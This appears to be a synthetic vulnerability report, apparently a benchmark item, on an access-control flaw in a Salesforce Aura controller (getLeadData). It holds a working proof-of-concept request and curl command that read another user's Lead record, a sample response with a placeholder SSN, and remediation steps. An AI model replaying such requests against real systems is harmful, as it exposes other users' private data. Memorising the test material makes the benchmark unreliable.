# Security Analysis Report
**System:** StreamCore VOD Platform (Salesforce-Integrated)
**Domain:** Media / Content Delivery
**Example ID:** SF-0119
**Artifact analyzed:** context.txt (sole source)

---

## Priority Findings

| # | Severity | Category | Title |
|---|----------|----------|-------|
| 1 | HIGH | Single-User — Pattern 10.2 | Parameter escalation — a valid session holder substitutes `leadId` in `c.LeadController.getLeadData` to extend their own session scope and read other users' Lead records |

---

## Finding 1 — Single-User: Parameter Escalation (Pattern 10.2)

### Summary
The Aura controller `c.LeadController.getLeadData` on StreamCore VOD Platform (`ecc6042a.lightning.force.com`) is vulnerable to a single-user parameter escalation attack. A user with a valid Salesforce session is issued a `leadId` scoped to their own records. Because `LeadController` runs `without sharing` and has no ownership check, the user can substitute any other `leadId` into the Aura action payload to read Lead records owned by other users. Per §5.0 Pattern 10.2, this is own-session-scope extension — the attacker does not need a different account, only their own valid session and an out-of-scope `leadId`.

**Context.txt inconsistency (documented):** §4.0 Apex class defines method `getLeadDetails`, but §5.0 and §6.0 HAR use `c.LeadController.getLeadData`. These conflict. The HAR (§6.0) is the primary evidence — `c.LeadController.getLeadData` is the authoritative affected Aura descriptor.

**Pattern:** 10.2 — Parameter escalation (own session scope extension) (Single-User)
**Affected controller:** `c.LeadController.getLeadData`
**Affected endpoint:** `POST https://ecc6042a.lightning.force.com/aura`

### Evidence from HAR (§6.0)

**Request — Attack**
```
POST https://ecc6042a.lightning.force.com/aura
Authorization: Bearer 00DECC6042A!ARecc6042a...
Content-Type: application/x-www-form-urlencoded
X-SFDC-Session: 00DECC6042A!ARecc6042a...

message={
  "actions": [{
    "id": "1;a",
    "descriptor": "c.LeadController.getLeadData",
    "callingDescriptor": "UNKNOWN",
    "params": {
      "leadId": "001042A",
      "fields": ["Id", "Name", "OwnerId", "InternalNotes__c", "SensitiveData__c"]
    }
  }]
}
```

**Response — Victim Lead Record Returned**
```json
{
  "actions": [{
    "id": "1;a",
    "state": "SUCCESS",
    "returnValue": {
      "records": [{
        "Id": "001042A",
        "Name": "Victim Lead Record",
        "OwnerId": "005VICTIM",
        "InternalNotes__c": "CONFIDENTIAL: internal review notes",
        "SensitiveData__c": "SSN: 000-47-9460"
      }]
    },
    "error": []
  }]
}
```
Victim's SSN `000-47-9460` and internal notes exposed. `OwnerId: 005VICTIM` confirms the record belongs to a different user.

### Steps to Reproduce
1. Authenticate to StreamCore on `ecc6042a.lightning.force.com` and obtain a valid session token.
2. POST to `/aura` substituting a victim's `leadId`:
```bash
curl -s -X POST "https://ecc6042a.lightning.force.com/aura" \
  -H "Authorization: Bearer 00DECC6042A!ARecc6042a..." \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "X-SFDC-Session: 00DECC6042A!ARecc6042a..." \
  --data-urlencode 'message={"actions":[{"id":"1;a","descriptor":"c.LeadController.getLeadData","callingDescriptor":"UNKNOWN","params":{"leadId":"001042A","fields":["Id","Name","OwnerId","InternalNotes__c","SensitiveData__c"]}}]}'
# Vulnerable: returns SensitiveData__c (SSN: 000-47-9460) and InternalNotes__c for victim lead 001042A
# Secure: {"actions":[{"state":"ERROR","error":[{"message":"Insufficient Permissions"}]}]}
```

### Remediation
1. Declare `LeadController` as `with sharing` to enforce OWD=Private.
2. Add `AND OwnerId = :UserInfo.getUserId()` to SOQL WHERE clause.
3. Add `WITH SECURITY_ENFORCED` to SOQL query.
